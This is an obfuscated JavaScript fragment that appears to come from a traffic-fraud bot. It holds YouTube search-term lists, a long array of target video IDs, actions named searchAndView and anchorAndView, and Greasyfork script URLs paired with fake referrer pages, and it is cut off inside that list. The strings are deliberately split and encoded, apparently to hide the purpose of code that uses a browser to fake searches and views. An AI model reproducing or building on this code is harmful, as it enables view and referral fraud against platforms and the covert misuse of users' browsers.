searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + a0(0x19) + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1 * -0x517 + 0x62b + 0x8 * -0x167)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0xafd * 0x1 + 0x31 * 0x49 + -0x1d * 0x1a)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1cbd + 0x1472 + -0x312c);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    Z(0x6, 'X0Dm') + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    a1(0x7) + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    Z(0x17, 'G$Bi') + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    a0(0x0) + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    Z(0xe, 'kxzX') + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    a1(0x11) + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    Z(0xc, '8y6N') + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a0(0xb) + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
